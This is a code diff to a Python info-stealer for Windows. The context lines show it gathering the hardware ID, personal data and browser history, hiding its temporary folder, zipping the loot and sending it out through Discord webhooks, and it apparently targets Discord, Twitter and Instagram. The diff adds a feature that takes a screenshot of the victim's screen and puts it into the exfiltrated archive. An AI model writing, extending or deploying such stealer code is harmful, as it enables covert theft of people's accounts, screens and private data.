@@ -22,8 +22,22 @@ from zipfile import ZipFile, ZIP_DEFLATED
 from cpuinfo import get_cpu_info
 from multiprocessing import freeze_support
 from tempfile import TemporaryDirectory
+import pyautogui
+import random
+import string
+
+
+Chrs = list(string.ascii_letters + string.digits) # random string and digits. will be used for the screenshot's file name the screenshot's file name will contain random digits and chars to avoid exceptions, overwriting.
+Shrs = "".join(random.choices(Chrs,k=5)) # combine 
 
 website = ['discord.com', 'twitter.com', 'instagram.com']
+
+
+def get_screenshot(path):
+    global scrn_name
+    scrn = pyautogui.screenshot()
+    scrn_name = f"{path}\\Screenshot_{Shrs}.png"
+    scrn.save(scrn_name)
 
 def get_hwid():
     p = Popen('wmic csproduct get uuid', shell=True, stdout=PIPE, stderr=PIPE)
@@ -201,6 +215,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
     p_lst = get_Personal_data()
     cpuinfo = get_cpu_info()
     with TemporaryDirectory(dir='.') as td:
+        get_screenshot(path=td)
         SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
         main_info = main(td)
         discord_T, twitter_T, insta_T = (PrettyTable(padding_width=1) for _ in range(3))
@@ -243,6 +258,11 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
             with open(os.path.join(td, 'History.txt'), 'w') as f:
                 f.write(find_His())
                 zip.write(f.name)
+            with open(scrn_name, "rb") as f:
+                try:
+                    zip.write(f.name)
+                except:
+                    pass
             for name_f, _ in files_names:
                 if os.path.exists(name_f):
                     zip.write(name_f)
